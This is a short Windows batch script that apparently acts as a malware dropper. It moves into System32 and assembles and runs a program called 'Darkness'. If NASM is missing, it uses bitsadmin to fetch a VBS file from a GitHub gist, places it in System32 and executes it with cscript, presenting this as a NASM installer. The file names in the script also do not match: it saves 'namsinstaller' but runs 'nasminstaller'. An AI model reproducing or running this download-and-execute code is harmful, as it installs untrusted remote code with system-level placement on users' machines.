@echo off
cd /d %windir%\system32

where nasm.exe >nul 2>&1
if %errorlevel% == 0 (
    nasm -f bin -o Darkness.com Darkness.asm
    Darkness.com
) else (
    set URL=https://gist.github.com/INeddHelp/b7485cc1ac3a14a20ddccc3ceef9442d
    set DESTINATION=%temp%\namsinstaller.vbs
    bitsadmin /transfer namsdownload /download /priority highest %URL% %DESTINATION%
    move /y %DESTINATION% %windir%\System32\namsinstaller.vbs
    cscript nasminstaller.vbs
)

